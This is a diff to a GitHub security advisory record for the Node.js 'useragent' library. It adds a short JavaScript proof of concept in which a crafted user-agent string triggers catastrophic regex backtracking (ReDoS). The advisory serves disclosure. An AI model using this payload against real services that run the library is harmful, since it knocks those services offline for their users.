@@ -36,9 +36,9 @@
     "nvd_published_at": "2024-10-26T21:15:14Z",
     "severity": "MODERATE"
   },
-  "details": "Useragent is a user agent parser for Node.js. All versions as of time of publication contain one or more regular expressions that are vulnerable to Regular Expression Denial of Service (ReDoS).",
+  "details": "Useragent is a user agent parser for Node.js. All versions as of time of publication contain one or more regular expressions that are vulnerable to Regular Expression Denial of Service (ReDoS).\n\n## PoC\n```js\nasync function exploit() {\n   const useragent = require(\\\"useragent\\\");\n\n   // Create a malicious user-agent that leads to excessive backtracking\n   const maliciousUserAgent = 'Mozilla/5.0 (' + 'X'.repeat(30000) + ') Gecko/20100101 Firefox/77.0';\n\n   // Parse the malicious user-agent\n   const agent = useragent.parse(maliciousUserAgent);\n\n   // Call the toString method to trigger the vulnerability\n   const result = await agent.device.toString();\n   console.log(result);\n}\n\nawait exploit();\n```",
   "id": "GHSA-mgfv-m47x-4wqp",
-  "modified": "2024-10-30T19:03:27Z",
+  "modified": "2025-09-03T15:17:53Z",
   "published": "2024-10-26T21:30:47Z",
   "references": [
     {
